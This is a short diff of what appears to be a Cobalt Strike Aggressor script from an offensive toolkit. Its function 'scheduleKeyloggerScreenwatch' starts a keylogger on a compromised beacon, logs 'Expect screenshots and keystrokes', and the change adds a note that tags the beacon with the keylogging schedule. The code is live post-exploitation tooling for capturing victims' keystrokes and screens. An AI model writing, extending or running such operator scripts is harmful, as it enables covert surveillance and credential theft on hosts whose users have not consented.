@@ -2508,6 +2508,8 @@ sub arsenal::scheduleKeyloggerScreenwatch {
 	bkeylogger($bid, binfo($bid, "pid"), binfo($bid, "arch"));
 
 	blog($bid, "Expect screenshots and keystrokes.");
+
+	bnote($bid, "$sleep $+ s-screenwatch-keylogger");
 }
 
 sub arsenal::note {
